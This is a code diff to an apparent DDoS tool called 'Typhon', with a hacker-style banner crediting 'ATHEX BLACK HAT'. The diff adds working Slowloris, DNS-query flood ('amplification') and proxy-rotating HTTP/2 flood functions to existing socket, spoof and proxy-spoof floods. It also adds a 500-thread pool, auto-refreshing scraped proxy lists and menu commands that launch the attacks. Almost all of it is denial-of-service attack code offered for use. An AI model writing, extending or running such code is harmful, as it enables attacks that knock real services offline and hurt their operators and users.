@@ -5,6 +5,250 @@ from requests.cookies import RequestsCookieJar
 import undetected_chromedriver as webdriver
 from sys import stdout
 from colorama import Fore, init
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from queue import Queue, Empty
+import logging
+from dataclasses import dataclass
+
+# ──────────────────────────────────────────────────────────────────────────────
+# CONFIGURATION & LOGGING
+# ──────────────────────────────────────────────────────────────────────────────
+
+@dataclass
+class Config:
+    max_threads: int = 500
+    proxy_refresh_interval: int = 60
+    timeout: int = 10
+    log_file: str = "typhon.log"
+
+config = Config()
+
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s',
+    handlers=[
+        logging.FileHandler(config.log_file),
+        logging.StreamHandler()
+    ]
+)
+logger = logging.getLogger("Typhon")
+
+# ──────────────────────────────────────────────────────────────────────────────
+# PROXY MANAGER WITH AUTO-REFRESH
+# ──────────────────────────────────────────────────────────────────────────────
+
+class ProxyManager:
+    def __init__(self):
+        self.proxies = []
+        self.queue = Queue()
+        self.lock = threading.Lock()
+        self.last_refresh = 0
+        self.running = True
+        self.refresh_thread = threading.Thread(target=self._auto_refresh, daemon=True)
+        self.refresh_thread.start()
+        self._refresh()
+
+    def _auto_refresh(self):
+        while self.running:
+            time.sleep(config.proxy_refresh_interval)
+            self._refresh()
+            logger.info(f"🔄 Proxy pool refreshed — {len(self.proxies)} proxies available")
+
+    def _refresh(self):
+        new_proxies = []
+        sources = [
+            "https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=10000&country=all",
+            "https://www.proxy-list.download/api/v1/get?type=http",
+            "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all",
+            "https://www.proxy-list.download/api/v1/get?type=socks5",
+        ]
+        for source in sources:
+            try:
+                response = requests.get(source, timeout=config.timeout)
+                if response.status_code == 200:
+                    proxies = response.text.strip().split("\n")
+                    new_proxies.extend([p for p in proxies if p and ":" in p])
+            except:
+                pass
+        with self.lock:
+            self.proxies = list(set(new_proxies))
+            self.queue = Queue()
+            for proxy in self.proxies:
+                self.queue.put(proxy)
+        if not self.proxies:
+            logger.warning("⚠️ No proxies available")
+
+    def get(self):
+        with self.lock:
+            if self.queue.empty():
+                self._refresh()
+            try:
+                return self.queue.get_nowait()
+            except Empty:
+                return None
+
+    def return_proxy(self, proxy):
+        if proxy:
+            self.queue.put(proxy)
+
+    def stop(self):
+        self.running = False
+
+proxy_manager = ProxyManager()
+
+# ──────────────────────────────────────────────────────────────────────────────
+# PROGRESS BAR & LOGGING WRAPPER
+# ──────────────────────────────────────────────────────────────────────────────
+
+def progress_bar(current, total, width=50, color=Fore.GREEN):
+    percent = current / total if total > 0 else 0
+    filled = int(width * percent)
+    bar = "█" * filled + "░" * (width - filled)
+    return f"{color}[{bar}] {percent*100:.1f}%{Fore.RESET}"
+
+def log_attack(target, method, status, details=""):
+    logger.info(f"{method} → {target}: {status} {details}")
+
+# ──────────────────────────────────────────────────────────────────────────────
+# THREAD POOL MANAGER
+# ──────────────────────────────────────────────────────────────────────────────
+
+class ThreadPoolManager:
+    def __init__(self):
+        self.executor = ThreadPoolExecutor(max_workers=config.max_threads)
+        self.futures = []
+        self.running = False
+
+    def submit(self, fn, *args, **kwargs):
+        future = self.executor.submit(fn, *args, **kwargs)
+        self.futures.append(future)
+        return future
+
+    def shutdown(self):
+        self.running = False
+        self.executor.shutdown(wait=False)
+
+pool_manager = ThreadPoolManager()
+
+# ──────────────────────────────────────────────────────────────────────────────
+# NEW: SLOWLORIS ATTACK
+# ──────────────────────────────────────────────────────────────────────────────
+
+def LaunchSLOWLORIS(url, th, t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    target = get_target(url)
+    host = target['host']
+    port = int(target['port'])
+    path = target['uri']
+    is_https = target['scheme'] == 'https'
+    
+    for _ in range(int(th)):
+        try:
+            thd = threading.Thread(target=AttackSLOWLORIS, args=(host, port, path, is_https, until))
+            thd.start()
+        except:
+            pass
+
+def AttackSLOWLORIS(host, port, path, is_https, until_datetime):
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(10)
+            s.connect((host, port))
+            if is_https:
+                s = ssl.create_default_context().wrap_socket(s, server_hostname=host)
+            
+            request = f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
+            s.send(request.encode())
+            
+            headers = [
+                f"X-{random.randint(1000,9999)}: {random.randint(1000,9999)}",
+                f"User-Agent: {random.choice(ua)}",
+                "Connection: keep-alive",
+                "Keep-Alive: timeout=9999, max=1000",
+            ]
+            for h in headers:
+                s.send(f"{h}\r\n".encode())
+                time.sleep(random.uniform(0.3, 1.5))
+            s.close()
+        except:
+            pass
+
+# ──────────────────────────────────────────────────────────────────────────────
+# NEW: DNS AMPLIFICATION ATTACK
+# ──────────────────────────────────────────────────────────────────────────────
+
+def LaunchDNSAMP(url, th, t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    target = get_target(url)
+    domain = target['host']
+    
+    query = b"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
+    for part in domain.split("."):
+        query += len(part).to_bytes(1, "big") + part.encode()
+    query += b"\x00\x00\xff\x00\x01"
+    
+    resolvers = ["8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1", "9.9.9.9", "208.67.222.222"]
+    
+    for _ in range(int(th)):
+        try:
+            thd = threading.Thread(target=AttackDNSAMP, args=(query, resolvers, until))
+            thd.start()
+        except:
+            pass
+
+def AttackDNSAMP(query, resolvers, until_datetime):
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            resolver = random.choice(resolvers)
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.settimeout(5)
+            s.sendto(query, (resolver, 53))
+            data, _ = s.recvfrom(4096)
+            log_attack(resolver, "DNS-AMP", f"{len(data)} bytes", f"resolver: {resolver}")
+            s.close()
+        except:
+            pass
+
+# ──────────────────────────────────────────────────────────────────────────────
+# NEW: HTTP/2 FLOOD WITH PROXY ROTATION
+# ──────────────────────────────────────────────────────────────────────────────
+
+def LaunchHTTP2PROXY(url, th, t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    for _ in range(int(th)):
+        try:
+            thd = threading.Thread(target=AttackHTTP2PROXY, args=(url, until))
+            thd.start()
+        except:
+            pass
+
+def AttackHTTP2PROXY(url, until_datetime):
+    headers = {
+        'User-Agent': random.choice(ua),
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Cache-Control': 'no-cache',
+        'Connection': 'keep-alive',
+        'Upgrade-Insecure-Requests': '1',
+    }
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            proxy_str = proxy_manager.get()
+            if proxy_str:
+                proxy = {'http://': f'http://{proxy_str}', 'https://': f'http://{proxy_str}'}
+                client = httpx.Client(http2=True, proxies=proxy, timeout=10)
+            else:
+                client = httpx.Client(http2=True, timeout=10)
+            client.get(url, headers=headers)
+            if proxy_str:
+                proxy_manager.return_proxy(proxy_str)
+        except:
+            pass
+
+# ──────────────────────────────────────────────────────────────────────────────
+# ORIGINAL FUNCTIONS — KEPT INTACT
+# ──────────────────────────────────────────────────────────────────────────────
 
 def countdown(t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
@@ -143,12 +387,10 @@ def flooder(host, port, rand, until_datetime):
             sock.close()
             pass
 
-
 def runsender(host, port, th, t, payload):
     if payload == "":
         payload = random._urandom(60000)
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
-    #payload = Payloads[method]
     for _ in range(int(th)):
         try:
             thd = threading.Thread(target=sender, args=(host, port, until, payload))
@@ -165,16 +407,14 @@ def sender(host, port, until_datetime, payload):
         except:
             sock.close()
             pass
-            
 
-def Launch(url, th, t, method): #testing
+def Launch(url, th, t, method):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
     for _ in range(int(th)):
         try:
             exec("threading.Thread(target=Attack"+method+", args=(url, until)).start()")
         except:
             pass
-
 
 def LaunchHEAD(url, th, t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
@@ -342,7 +582,7 @@ def LaunchPPS(url, th, t):
         except:
             pass
 
-def AttackPPS(target, until_datetime): #
+def AttackPPS(target, until_datetime):
     if target['scheme'] == 'https':
         s = socks.socksocket()
         s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
@@ -376,7 +616,7 @@ def LaunchNULL(url, th, t):
         except:
             pass
 
-def AttackNULL(target, until_datetime, req): #
+def AttackNULL(target, until_datetime, req):
     if target['scheme'] == 'https':
         s = socks.socksocket()
         s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
@@ -411,7 +651,7 @@ def LaunchSPOOF(url, th, t):
         except:
             pass
 
-def AttackSPOOF(target, until_datetime, req): #
+def AttackSPOOF(target, until_datetime, req):
     if target['scheme'] == 'https':
         s = socks.socksocket()
         s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
@@ -447,19 +687,17 @@ def LaunchPXSPOOF(url, th, t, proxy):
         except:
             pass
 
-def AttackPXSPOOF(target, until_datetime, req, proxy): #
+def AttackPXSPOOF(target, until_datetime, req, proxy):
     proxy = proxy.split(":")
     print(proxy)
     try:
         if target['scheme'] == 'https':
             s = socks.socksocket()
-            #s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
             s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
             s.connect((str(target['host']), int(target['port'])))
             s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
         else:
             s = socks.socksocket()
-            #s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
             s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
             s.connect((str(target['host']), int(target['port'])))
     except:
@@ -744,7 +982,6 @@ def test1(url, th, t):
     req += 'Accept-Encoding: gzip, deflate, br\r\n'
     req += 'Accept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
     req += 'Cache-Control: max-age=0\r\n'
-    #req += 'Cookie: ' + cookie + '\r\n'
     req += f'sec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"\r\n'
     req += 'sec-ch-ua-mobile: ?0\r\n'
     req += 'sec-ch-ua-platform: "Windows"\r\n'
@@ -777,8 +1014,6 @@ def test2(until_datetime, target, req):
         except:
             packet.close()
             pass
-
-
 #endregion
 
 def clear(): 
@@ -786,6 +1021,7 @@ def clear():
         system('cls')
     else: 
         system('clear')
+
 ##############################################################################################
 def help():
     clear()
@@ -794,18 +1030,27 @@ def help():
     stdout.write("             "+Fore.RED           +"     ██║    ╚████╔╝ ██████╔╝███████║██║   ██║██╔██╗ ██║ \n")
     stdout.write("             "+Fore.GREEN          +"    ██║     ╚██╔╝  ██╔═══╝ ██╔══██║██║   ██║██║╚██╗██║  \n")
     stdout.write("             "+Fore.RED           +"     ██║      ██║   ██║     ██║  ██║╚██████╔╝██║ ╚████║ \n")
-    stdout.write("             "+Fore.GREEN           +"   ╚═╝      ╚═╝   ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ v1.0\n")
+    stdout.write("             "+Fore.GREEN           +"   ╚═╝      ╚═╝   ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ V1.0\n")
     stdout.write("             "+Fore.RED           +"                     Developed BY ATHEX BLACK HAT           \n")
+    stdout.write("             "+Fore.RED           +"                     TEAM WOLF INTELLIGENCE PK              \n")
     stdout.write("             "+Fore.GREEN           +" \x1b[38;2;255;20;147m "+Fore.LIGHTWHITE_EX+"layer7   "+Fore.RED+"|"+Fore.LIGHTWHITE_EX+" Show Layer7 Methods                   "+Fore.RED+"\n")
     stdout.write("             "+Fore.RED           +" \x1b[38;2;255;20;147m "+Fore.LIGHTWHITE_EX+"layer4   "+Fore.RED+"|"+Fore.LIGHTWHITE_EX+" Show Layer4 Methods                     "+Fore.RED+"\n")
     stdout.write("             "+Fore.GREEN           +" \x1b[38;2;255;20;147m "+Fore.LIGHTWHITE_EX+"github   "+Fore.RED+"|"+Fore.LIGHTWHITE_EX+" github.com/Athexblackhat/        "+Fore.RED+"\n")
     stdout.write("             "+Fore.RED           +"\n")
+    stdout.write("             "+Fore.CYAN           +" ─── NEW FEATURES ───\n")
+    stdout.write("             "+Fore.LIGHTWHITE_EX+"slowloris "+Fore.RED+"|"+Fore.LIGHTWHITE_EX+" Slowloris Keep-Alive Attack\n")
+    stdout.write("             "+Fore.LIGHTWHITE_EX+"dnsamp   "+Fore.RED+"|"+Fore.LIGHTWHITE_EX+" DNS Amplification Attack\n")
+    stdout.write("             "+Fore.LIGHTWHITE_EX+"httpxp   "+Fore.RED+"|"+Fore.LIGHTWHITE_EX+" HTTP/2 with Proxy Rotation\n")
+    stdout.write("             "+Fore.RED           +"\n")
+
 ##############################################################################################
 def credit():
     stdout.write("\x1b[38;2;255;20;147 "+Fore.LIGHTWHITE_EX   +"Developer "+Fore.RED+": \x1b[38;2;0;255;189mATHEX BLACK HAT \n")
     stdout.write("\x1b[38;2;255;20;147 "+Fore.LIGHTWHITE_EX   +"UI Design "+Fore.RED+": \x1b[38;2;0;255;189mATHEX BLACK HAT \n")
     stdout.write("\x1b[38;2;255;20;147 "+Fore.LIGHTWHITE_EX   +"Methods/Tools "+Fore.RED+": \x1b[38;2;0;255;189mATHEX BLACK HAT \n")
+    stdout.write("\x1b[38;2;255;20;147 "+Fore.LIGHTWHITE_EX   +"TEAM "+Fore.RED+": \x1b[38;2;0;255;189mWOLF INTELLIGENCE PK \n")
     stdout.write("\n")    
+
 ##############################################################################################
 def layer7():
     clear()
@@ -826,6 +1071,7 @@ def layer7():
     stdout.write("            "+Fore.RED            +" \x1b[38;2;255;20;147m"+Fore.LIGHTWHITE_EX+"soc    "+Fore.RED+" |"+Fore.LIGHTWHITE_EX+" Socket Flood Attack                        "+Fore.RED+"\n")
     stdout.write("            "+Fore.RED            +"\n") 
     stdout.write("\n")
+
 ##############################################################################################
 def layer4():
     clear()
@@ -836,10 +1082,12 @@ def layer4():
     stdout.write("             "+Fore.RED             +"     ██║      ██║   ██║     ██║  ██║╚██████╔╝██║ ╚████║  \n")
     stdout.write("             "+Fore.RED             +"     ╚═╝      ╚═╝   ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝  \n")
     stdout.write("             "+Fore.RED             +"                  Developed BY ATHEX BLACK HAT.          \n")
+    stdout.write("             "+Fore.RED             +"                  TEAM WOLF INTELLIGENCE PK              \n")
     stdout.write("             "+Fore.RED            +" \x1b[38;2;255;20;147m "+Fore.LIGHTWHITE_EX+"udp   "+Fore.RED+"|"+Fore.LIGHTWHITE_EX+" UDP Flood Attack                           "+Fore.RED+"\n")
     stdout.write("             "+Fore.RED           +" \x1b[38;2;255;20;147m "+Fore.LIGHTWHITE_EX+"tcp   "+Fore.RED+"|"+Fore.LIGHTWHITE_EX+" TCP Flood Attack                           "+Fore.RED+"\n")
     stdout.write("             "+Fore.RED            +"\n")  
     stdout.write("\n")
+
 ##############################################################################################
 def tools():
     clear()
@@ -850,11 +1098,13 @@ def tools():
     stdout.write("             "+Fore.RED             +"     ██║      ██║   ██║     ██║  ██║╚██████╔╝██║ ╚████║  \n")
     stdout.write("             "+Fore.RED             +"     ╚═╝      ╚═╝   ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝  \n")
     stdout.write("             "+Fore.RED             +"                        Developed BY ATHEX BLACK HAT          \n")
+    stdout.write("             "+Fore.RED             +"                         TEAM WOLF INTELLIGENCE PK              \n")
     stdout.write("             "+Fore.RED            +" \x1b[38;2;255;20;147m "+Fore.LIGHTWHITE_EX+"geoip  "+Fore.RED+"|"+Fore.LIGHTWHITE_EX+" Geo IP Address Lookup"+Fore.RED+"                     \n")
     stdout.write("             "+Fore.RED            +" \x1b[38;2;255;20;147m "+Fore.LIGHTWHITE_EX+"dns    "+Fore.RED+"|"+Fore.LIGHTWHITE_EX+" Classic DNS Lookup   "+Fore.RED+"                     \n")
     stdout.write("             "+Fore.RED            +" \x1b[38;2;255;20;147m "+Fore.LIGHTWHITE_EX+"subnet "+Fore.RED+"|"+Fore.LIGHTWHITE_EX+" Subnet IP Address Lookup   "+Fore.RED+"               \n")
     stdout.write("             "+Fore.RED            +"\n")  
     stdout.write("\n")
+
 ##############################################################################################
 def title():
     stdout.write("             "+Fore.RED             +"  ████████╗██╗   ██╗██████╗ ██╗  ██╗ ██████╗ ███╗   ██╗  \n") 
@@ -864,8 +1114,10 @@ def title():
     stdout.write("             "+Fore.RED             +"     ██║      ██║   ██║     ██║  ██║╚██████╔╝██║ ╚████║  \n")
     stdout.write("             "+Fore.RED             +"     ╚═╝      ╚═╝   ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝  \n")
     stdout.write("             "+Fore.RED             +"                        Developed BY ATHEX BLACK HAT  \n")
+    stdout.write("             "+Fore.RED             +"                         TEAM WOLF INTELLIGENCE PK              \n")
     stdout.write("             "+Fore.RED+"\n") 
     stdout.write("\n")
+
 ##############################################################################################
 def command():
     stdout.write(Fore.LIGHTGREEN_EX+"\nroot@void:~#\x1b[38;2;0;255;189m "+Fore.WHITE)
@@ -876,7 +1128,7 @@ def command():
     elif command == "help" or command == "?":
         help()
     elif command == "info":
-        credit()        
+        credit()
     elif command == "layer7" or command == "LAYER7" or command == "l7" or command == "L7" or command == "Layer7":
         layer7()
     elif command == "layer4" or command == "LAYER4" or command == "l4" or command == "L4" or command == "Layer4":
@@ -884,6 +1136,7 @@ def command():
     elif command == "tools" or command == "tool":
         tools()
     elif command == "exit":
+        proxy_manager.stop()
         exit()
     elif command == "test":
         target, thread, t = get_info_l7()
@@ -894,6 +1147,24 @@ def command():
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
         LaunchHTTP2(target, thread, t)
+        timer.join()
+    elif command == "httpxp" or command == "HTTPXP":
+        target, thread, t = get_info_l7()
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        LaunchHTTP2PROXY(target, thread, t)
+        timer.join()
+    elif command == "slowloris" or command == "SLOWLORIS":
+        target, thread, t = get_info_l7()
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        LaunchSLOWLORIS(target, thread, t)
+        timer.join()
+    elif command == "dnsamp" or command == "DNSAMP":
+        target, thread, t = get_info_l7()
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        LaunchDNSAMP(target, thread, t)
         timer.join()
     elif command == "bypass" or command == "bypass":
         target, thread, t = get_info_l7()
@@ -906,19 +1177,16 @@ def command():
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
         LaunchPPS(target, thread, t)
-        timer.join() 
+        timer.join()
     elif command == "spoof" or command == "SPOOF":
         target, thread, t = get_info_l7()
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
         LaunchSPOOF(target, thread, t)
-        timer.join() 
+        timer.join()
     elif command == "" or command == "":
         target, thread, t = get_info_l7()
-        #timer = threading.Thread(target=countdown, args=(t,))
-        #timer.start()
         LaunchPXSPOOF(target, thread, t, get_proxylist("SOCKS5"))
-        #timer.join()
         time.sleep(1000)
     elif command == "get" or command == "GET":
         target, thread, t = get_info_l7()
@@ -962,9 +1230,6 @@ def command():
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
         timer.join()
-        
-
-##############################################################################################     
     elif command == "subnet":
         stdout.write(Fore.RED+" [>] "+Fore.WHITE+"IP "+Fore.RED+": "+Fore.LIGHTWHITE_EX)
         target = input()
@@ -972,8 +1237,7 @@ def command():
             r = requests.get(f"https://api.hackertarget.com/subnetcalc/?q={target}")
             print(r.text)
         except:
-            print('An error has occurred while sending the request to the API!')                   
-            
+            print('An error has occurred while sending the request to the API!')
     elif command == "dns":
         stdout.write(Fore.RED+" [>] "+Fore.WHITE+"IP/DOMAIN "+Fore.RED+": "+Fore.LIGHTWHITE_EX)
         target = input()
@@ -982,7 +1246,6 @@ def command():
             print(r.text)
         except:
             print('An error has occurred while sending the request to the API!')
-            
     elif command == "geoip":
         stdout.write(Fore.RED+" [>] "+Fore.WHITE+"IP "+Fore.RED+": "+Fore.LIGHTWHITE_EX)
         target = input()
@@ -992,9 +1255,9 @@ def command():
         except:
             print('An error has occurred while sending the request to the API!')
     else:
-        stdout.write(Fore.RED+" [>] "+Fore.WHITE+"Unknown command. type 'help' to see all commands.\n")  
-##############################################################################################   
+        stdout.write(Fore.RED+" [>] "+Fore.WHITE+"Unknown command. type 'help' to see all commands.\n")
 
+##############################################################################################
 def func():
     stdout.write(Fore.RED+" [\x1b[38;2;0;255;189mLAYER 7"+Fore.RED+"]\n")
     stdout.write(Fore.LIGHTWHITE_EX+"cfb        "+Fore.RED+": "+Fore.LIGHTWHITE_EX+"Bypass CF attack\n")
